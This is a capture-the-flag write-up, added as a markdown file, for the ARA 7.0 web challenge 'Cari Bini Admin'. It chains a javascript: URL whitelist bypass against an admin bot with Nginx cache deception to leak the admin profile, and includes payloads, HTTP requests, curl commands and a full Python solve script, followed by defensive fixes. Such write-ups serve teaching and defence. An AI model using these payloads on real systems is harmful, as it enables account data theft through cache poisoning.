@@ -1,0 +1,304 @@
+---
+title: 'Qualification ARA 7.0 - Cari Bini Admin'
+description: 'Chaining a javascript: URL whitelist bypass with Nginx cache deception to leak the admin profile.'
+date: 2026-03-17
+category: 'qualification-ara-7-0'
+discipline: 'web-exploit'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+Cari Bini Admin was a good example of a web challenge that only becomes solvable once the entire trust chain is mapped. The application itself looked simple: log in, view a profile, and submit a URL for an admin bot to visit. The flag was stored in the admin's `pacar` field, so the real problem was not authentication in the usual sense, but finding a way to make the admin's browser touch something useful and then leak the result back to us.
+
+What made the challenge interesting was that a single bug was not enough. The final solve chained three ideas together:
+
+- a hostname whitelist bypass in the bot URL validation
+- a cache confusion issue in Nginx caused by semicolon normalization
+- a cookie-less cache retrieval technique to read the admin's cached profile
+
+## Challenge Information
+
+- Category: Web Exploitation
+- Difficulty: Medium (subjective)
+- Event: ARA7 CTF Qualifications
+- Challenge: View your profile and use the admin bot feature to recover the admin's hidden `pacar` field
+- Goal: Exfiltrate the admin profile data and extract the flag
+
+The flag was:
+
+```text
+ARA7{w3b_12eC1pT101n_Chh4114n8e_Pliss_MaafIn_GW_Kalo_ad_SLAH_kstirl}
+```
+
+## Initial Analysis
+
+From the user side, the site exposed two important capabilities:
+
+- a normal account area at `/myaccount`
+- a bot submission form at `/myaccount/bot`
+
+The first useful clue came from the provided source and deployment setup. The challenge was split into three pieces:
+
+- an Express application for login and profile rendering
+- a Playwright bot that visited submitted URLs as the admin
+- an Nginx reverse proxy in front of the app
+
+That architecture mattered immediately. When a challenge includes both a bot and a proxy cache, it is usually a sign that the intended path is not just XSS or SSRF, but some interaction between browser behavior and caching behavior.
+
+The first pass was done with:
+
+- Burp Suite for request replay and parameter testing
+- browser devtools to inspect the normal application flow
+- `curl` for fast manual checks
+- the source code to confirm what the server and bot were actually doing
+
+Two parts stood out during review:
+
+1. The bot accepted a `path` parameter and validated it with Node.js `new URL(...)`.
+2. Nginx had a cache rule for paths matching `^/myaccount.*/resource`, with special normalization logic for semicolons.
+
+At that point, the challenge stopped looking like a simple bot-XSS task and started looking like a parser mismatch plus cache abuse problem.
+
+## Recon / Enumeration
+
+Because source code and config were available, brute forcing was less important than understanding the intended traffic flow. I still like to confirm exposed routes manually before trusting the code.
+
+Basic checks looked like this:
+
+```bash
+curl -i http://challenge.ara-its.id:3333/
+curl -i -c cookies.txt -X POST http://challenge.ara-its.id:3333/login
+curl -i -b cookies.txt http://challenge.ara-its.id:3333/myaccount
+curl -i -b cookies.txt -X POST http://challenge.ara-its.id:3333/myaccount/bot \
+  --data-urlencode "path=https://google.com"
+```
+
+If source code had not been provided, a quick content discovery pass would still have been reasonable:
+
+```bash
+ffuf -u http://challenge.ara-its.id:3333/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -fc 404
+```
+
+The important findings from enumeration were:
+
+- `/myaccount` returned profile data for the current session
+- `/myaccount/bot` forwarded a user-controlled URL to the admin bot
+- the bot allowed only `google.com` as a hostname
+- the bot browser ran with `--disable-web-security`
+- the bot could reach `127.0.0.1:9090`, but not arbitrary external hosts
+- Nginx cached a strange route pattern based on `/myaccount.../resource`
+
+The last two points were the key. If the bot could not exfiltrate data to an external server, then any successful exploit needed an internal exfiltration channel. The proxy cache was the obvious candidate.
+
+## Vulnerability Discovery
+
+### 1. Hostname whitelist bypass in the bot
+
+The bot validated URLs with Node.js:
+
+```javascript
+const urlCheck = new URL(rawPath);
+const allowedHosts = ["google.com"];
+if (!allowedHosts.includes(urlCheck.hostname)) {
+  return res.render("bot", { message: "Error: Host tidak diizinkan!" });
+}
+```
+
+At first glance, that looks reasonable. The problem is that `new URL(...)` only decides whether the hostname is allowed. It does not guarantee that the browser will later interpret the string in the same security-relevant way.
+
+The bypass was:
+
+```text
+javascript://google.com/%0aalert(1)
+```
+
+Why this works:
+
+- Node.js parses `google.com` as the hostname because of the `//google.com/` authority section
+- the scheme is still `javascript:`
+- `%0a` becomes a newline
+- the browser executes the JavaScript that follows the newline
+
+So the whitelist checks the hostname, but the browser executes JavaScript anyway. That is a classic parser mismatch.
+
+### 2. Cache confusion through semicolon normalization
+
+The Nginx config contained the real exfiltration primitive:
+
+```nginx
+location ~* "^/myaccount.*/resource" {
+    map $uri $normalized_uri {
+        "~^(?<base>[^;]+);.*$"  $base;
+        default                 $uri;
+    }
+
+    rewrite ^ $normalized_uri break;
+    proxy_cache mycache;
+    proxy_cache_key "$uri?id=$u_id";
+    proxy_cache_valid 200 10s;
+}
+```
+
+This introduced a dangerous mismatch between routing and caching.
+
+Take this path:
+
+```text
+/myaccount;/ABC/resource/X?id=admin
+```
+
+It behaves like this:
+
+- it matches the cache-enabled location because the path still contains `/resource`
+- the semicolon normalization rewrites the upstream request to `/myaccount`
+- the backend responds with profile data
+- Nginx stores that response in cache under the original cache key derived from the crafted URI
+
+In other words, a request that looks like a static resource path gets cached, but the upstream content actually comes from `/myaccount`.
+
+### 3. Why direct exfiltration was not enough
+
+Normally, once a `javascript:` bot bypass is found, the next step is to send the stolen data to an attacker-controlled server. That was not possible here because the bot was effectively local-only.
+
+So the solve path became:
+
+- make the admin bot request a cacheable path
+- force Nginx to cache the admin's `/myaccount` response under that path
+- request the cached object ourselves without cookies
+
+That last detail is critical. If we sent our own cookies when reading the cache path, the backend could serve our own session data instead of the already-cached admin response. The cleanest approach is a plain request with no session at all.
+
+## Exploitation
+
+The full chain was short once the primitives were understood.
+
+### Step 1: Log in as a normal user
+
+Any normal session was enough to access the bot submission form:
+
+```http
+POST /login HTTP/1.1
+Host: challenge.ara-its.id:3333
+```
+
+### Step 2: Submit a `javascript:` payload that passes the whitelist
+
+The payload used the `google.com` hostname bypass and then triggered a fetch to a cacheable local path:
+
+```text
+javascript://google.com/%0afetch('http://127.0.0.1:9090/myaccount;/ABC/resource/X?id=admin')
+```
+
+A matching request looked like this:
+
+```http
+POST /myaccount/bot HTTP/1.1
+Host: challenge.ara-its.id:3333
+Content-Type: application/x-www-form-urlencoded
+
+path=javascript://google.com/%0afetch('http://127.0.0.1:9090/myaccount;/ABC/resource/X?id=admin')
+```
+
+What happened on the bot side:
+
+- the URL validator accepted the payload because `hostname === "google.com"`
+- Chromium executed the `javascript:` body
+- the bot, running with admin cookies, fetched the crafted `/myaccount;/ABC/resource/X?id=admin` path
+- Nginx rewrote the upstream request to `/myaccount`
+- the admin profile was cached under the crafted resource-like URI
+
+### Step 3: Retrieve the cached response without cookies
+
+Once the bot had primed the cache, we could request the same URL ourselves:
+
+```bash
+curl -i 'http://challenge.ara-its.id:3333/myaccount;/ABC/resource/X?id=admin'
+```
+
+No cookies were needed. That was the whole point. We were not trying to authenticate as admin; we were trying to read a cached response that had already been generated in the admin context.
+
+### Step 4: Extract the flag from the admin profile
+
+The profile page rendered the `pacar` field, and for the admin account that field contained the flag.
+
+## Working Exploit Script
+
+Below is a cleaned-up solve script based on the final exploit chain:
+
+```python
+#!/usr/bin/env python3
+
+import re
+import time
+import requests
+
+TARGET_URL = "http://challenge.ara-its.id:3333"
+LOGIN_URL = f"{TARGET_URL}/login"
+BOT_URL = f"{TARGET_URL}/myaccount/bot"
+CACHE_PATH = "/myaccount;/ABC/resource/X?id=admin"
+
+
+def main():
+    session = requests.Session()
+
+    # 1. Create a normal user session.
+    session.post(LOGIN_URL)
+
+    # 2. Make the admin bot fetch a cacheable path that rewrites to /myaccount.
+    absolute_target = f"http://127.0.0.1:9090{CACHE_PATH}"
+    payload = f"javascript://google.com/%0afetch('{absolute_target}')"
+    session.post(BOT_URL, data={"path": payload})
+
+    # 3. Wait briefly for the bot request to complete and the cache to populate.
+    time.sleep(1)
+
+    # 4. Read the cached admin response without cookies.
+    response = requests.get(f"{TARGET_URL}{CACHE_PATH}")
+    match = re.search(r"ARA7\\{[^}]+\\}", response.text)
+
+    if match:
+        print(match.group(0))
+    else:
+        print("Flag not found, retry while the cache window is still valid.")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Getting the Flag
+
+After the cache was primed by the admin bot, the response at the crafted path contained the admin profile page. The flag was embedded directly in the `pacar` field and could be extracted with a simple regex.
+
+Example output:
+
+```text
+ARA7{w3b_12eC1pT101n_Chh4114n8e_Pliss_MaafIn_GW_Kalo_ad_SLAH_kstirl}
+```
+
+## Key Takeaways
+
+- The main vulnerability was not one bug, but a chain: URL parser confusion plus cache deception.
+- A hostname whitelist is not enough if the scheme itself remains dangerous. `javascript:` should never be accepted in this kind of workflow.
+- Cache behavior has to be analyzed together with URL normalization. If routing logic and cache key logic disagree, attackers get weird but powerful primitives.
+- Bot challenges often become much more interesting when external exfiltration is blocked. In that case, internal storage, caches, redirects, or side channels become the real target.
+
+From a defensive point of view, the fixes are straightforward:
+
+- reject dangerous schemes entirely and explicitly allow only `http` and `https`
+- avoid mixed normalization rules between cache keys and upstream routing
+- do not cache authenticated content under attacker-controlled paths
+- do not ignore session-related behavior when storing personalized responses
+
+## Final Thoughts
+
+This was a clean web challenge because every piece of the deployment mattered. The bot bypass by itself was interesting, but the challenge only became solvable after realizing that the cache could be used as the exfiltration channel. That made the final exploit feel less like random payload crafting and more like joining three small trust mistakes into one reliable chain.
+
+## References
+
+- [Web Cache Deception](https://portswigger.net/research/web-cache-deception)
+- [A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
